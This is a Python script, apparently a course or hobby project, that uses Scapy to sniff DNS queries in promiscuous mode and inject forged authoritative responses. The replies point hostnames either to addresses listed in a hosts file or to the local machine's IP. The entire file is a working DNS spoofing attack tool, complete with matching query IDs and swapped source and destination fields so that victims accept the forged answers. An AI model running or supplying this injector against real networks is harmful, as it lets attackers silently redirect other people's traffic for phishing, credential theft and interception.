from scapy.all import *
import netifaces
import timeit
import argparse

# This is to sniff packets in promiscous mode
conf.sniff_promisc=True

device = ''
spoofed_ip = ''
using_defaultIP = False
host_ip_dict = {}
bpf_filter = 'udp port 53'

# This allows me to get the default network device if not specified
def get_default_device():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

# This function gets the default IP address
def get_default_ip():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

# This parses the host file and populates the map with the
# hostnames and the IP addresses
def populate_host_table(hostfile):
    with open(hostfile) as opened:
        for line in opened:
            split_line = line.split()
            host_ip_dict[split_line[1] + "."] = split_line[0]

# The following is parsing the arguments
parser = argparse.ArgumentParser(description='Parsing arguements', add_help=False)
parser.add_argument('-i', help='Specified device', required=False)
parser.add_argument('-h', help='List of hostnames', required=False)
parser.add_argument("expresion", type=str, help="this is a string", nargs='?')
args = vars(parser.parse_args())

# Checking will arguemnts were parsed
try:
    if args['i']:
        device = args['i']
        print "Sepecified interface!"
    else:
        device = get_default_device()
    
    if args['expresion']:
        bpf_filter = args['expresion'] + " and port 53 and udp"
    else:
        bpf_filter = "port 53 and udp"

    if args['h']:
        populate_host_table(args['h'])
    else:
        using_defaultIP = True 
        spoofed_ip = get_default_ip()
except:
    print "Invalid interface."
    sys.exit(1)

print "default device: " + device
print "Local IP: " , spoofed_ip
print "Expression ", bpf_filter


def dns_inject(pkt):
    # The following checks if the current UPD packet is a DNS request
    if pkt.haslayer(DNSQR):

        start = timeit.timeit()
        print "Got a DNS packet: " + pkt[DNS].qd.qname
        
        # We first need to check if this packet has a host name that
        # we are interested on or if the hostfile was empty
        host_n = pkt[DNS].qd.qname
        if spoofed_ip or host_n in host_ip_dict:
            
            # Depending on the arguements the response sets accordingly
            if using_defaultIP:
                dns_response = spoofed_ip
            else:
                dns_response = host_ip_dict[host_n]

            # We create a new packet switching src and dest IPs and 
            # Copying the ID so that it matches the original query
            # We then send the specifies IP as the response data
            spoofed_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=dns_response))
        
            send(spoofed_packet)
            end = timeit.timeit()
            print "It took ", end - start
            print 'Sent:', spoofed_packet.summary()

sniff(filter=bpf_filter, iface=device, store=0, prn=dns_inject)
